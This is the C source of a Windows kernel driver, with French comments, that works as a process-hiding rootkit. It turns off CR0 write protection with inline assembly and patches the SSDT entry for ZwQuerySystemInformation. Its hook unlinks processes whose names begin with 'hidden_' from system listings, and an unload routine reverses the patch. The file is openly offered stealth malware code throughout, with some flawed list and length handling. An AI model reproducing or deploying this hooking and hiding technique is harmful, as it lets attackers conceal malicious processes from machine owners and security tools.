#include <ntddk.h>

#pragma pack(1)
typedef struct ServiceDescriptorEntry {
unsigned int *ServiceTableBase;
unsigned int *ServiceCounterTableBase;
unsigned int NumberOfServices;
unsigned char *ParamTableBase;
} SSDT_Entry;
#pragma pack()

//récupération de la SSDT de ntoskernel.exe
__declspec(dllimport) SSDT_Entry KeServiceDescriptorTable;

//récupération de l'adresse de la SSDT
#define SYSTEMSERVICE(_func) \
KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_func+1)]

struct _SYSTEM_THREADS
{
        LARGE_INTEGER           KernelTime;
        LARGE_INTEGER           UserTime;
        LARGE_INTEGER           CreateTime;
        ULONG                   WaitTime;
        PVOID                   StartAddress;
        CLIENT_ID               ClientIs;
        KPRIORITY               Priority;
        KPRIORITY               BasePriority;
        ULONG                   ContextSwitchCount;
        ULONG                   ThreadState;
        KWAIT_REASON            WaitReason;
};
struct _SYSTEM_PROCESS_INFORMATION
{
        ULONG                  	NextEntryOfData;
        ULONG                  	ThreadCount;
        ULONG                   Reserved[6];
        LARGE_INTEGER           CreateTime;
        LARGE_INTEGER           UserTime;
        LARGE_INTEGER           KernelTime;
        UNICODE_STRING          ProcessName;
        KPRIORITY               BasePriority;
        ULONG                   ProcessId;
        ULONG                   InheritedFromProcessId;
        ULONG                   HandleCount;
        ULONG                   Reserved2[2];
        VM_COUNTERS            	VmCounters;
        IO_COUNTERS             IoCounters; //windows 2000 only
        struct _SYSTEM_THREADS  Threads[1];
}SYSTEM_PROCESS_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI ZwQuerySystemInformation(
IN ULONG SystemInformationClass,
			IN PVOID SystemInformation,
			IN ULONG SystemInformationLength,
			OUT PULONG ReturnLength);

//définition du type de fonction qu'on va hooker
typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
);


void unHookSSDT();
ZWQUERYSYSTEMINFORMATION TrueZwQuerySystemInformation;


NTSTATUS MyZwQuerySystemInformation(
ULONG SystemInformationClass,
PVOID SystemInformation,
ULONG SystemInformationLength,
PULONG ReturnLength)
{
	//on call l'originale
	struct _SYSTEM_PROCESS_INFORMATION* current;
	struct _SYSTEM_PROCESS_INFORMATION* last;
	ULONG next;

	NTSTATUS temp=TrueZwQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	
	//si sysinfoclass=process
	if(SystemInformationClass==5 && temp==0x00)
	{
		current=(struct _SYSTEM_PROCESS_INFORMATION *)SystemInformation;
		last=NULL;
		
		while(current!=NULL)
		{
			if(current->ProcessName.Length>3)
				if(current->ProcessName.Buffer[0]==L'h' &&
					current->ProcessName.Buffer[1]==L'i' &&
					current->ProcessName.Buffer[2]==L'd' &&
					current->ProcessName.Buffer[3]==L'd' &&
					current->ProcessName.Buffer[4]==L'e' &&
					current->ProcessName.Buffer[5]==L'n' &&
					current->ProcessName.Buffer[6]==L'_')
				{
					if(last!=NULL) last->NextEntryOfData=last->NextEntryOfData+current->NextEntryOfData;
				}

			if(current->NextEntryOfData==0) 
				current=NULL;
			else
			{
				last=current;
				next=(ULONG)current+current->NextEntryOfData;
				current=(struct _SYSTEM_PROCESS_INFORMATION *)next;
			}
		}
	}

	return temp;
}

VOID unload(PDRIVER_OBJECT pDriverObject)
{
	 unHookSSDT();
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	DbgPrint("--- LOAD - HOOK ---");
    pDriverObject->DriverUnload = unload;
	 
	TrueZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION) SYSTEMSERVICE(ZwQuerySystemInformation);
	DbgPrint("ZwQuerySystemInformation okay");
	
	 __asm
	{
	push eax // on sauvegarde eax
	mov  eax, CR0 // on met la valeur de CR0 dans eax
	and  eax, 0FFFEFFFFh // on applique le filtre inverseur
	mov  CR0, eax // on change la valeur de CR0
	pop  eax
	}
	DbgPrint("CR0 trick OK");
	
	SYSTEMSERVICE(ZwQuerySystemInformation) = (unsigned long*) MyZwQuerySystemInformation;	
	
	__asm
	{
	push eax
	mov  eax, CR0
	or   eax, NOT 0FFFEFFFFh // l’opération inverse de tout à l’heure pour récupérer l’état de CR0 comme il était avant le hook
	mov  CR0, eax
	pop  eax // on récupère eax
	}
	DbgPrint("CR0 trick 2 OK");
    
	DbgPrint("--- HOOK OK ---");
    return STATUS_SUCCESS;
}


void unHookSSDT()
{
	DbgPrint("--- UNHOOKING ---");
	__asm
	{
	push eax // on sauvegarde eax
	mov  eax, CR0 // on met la valeur de CR0 dans eax
	and  eax, 0FFFEFFFFh // on applique le filtre inverseur
	mov  CR0, eax // on change la valeur de CR0
	pop  eax
	}
	DbgPrint("CR0 trick OK");
	
	SYSTEMSERVICE(ZwQuerySystemInformation) = (ULONG *) TrueZwQuerySystemInformation;	
	
	__asm
	{
	push eax
	mov  eax, CR0
	or   eax, NOT 0FFFEFFFFh // l’opération inverse de tout à l’heure pour récupérer l’état de CR0 comme il était avant le hook
	mov  CR0, eax
	pop  eax // on récupère eax
	}
	DbgPrint("CR0 trick 2 OK");

	DbgPrint("--- UNHOOKING OK ---");
}
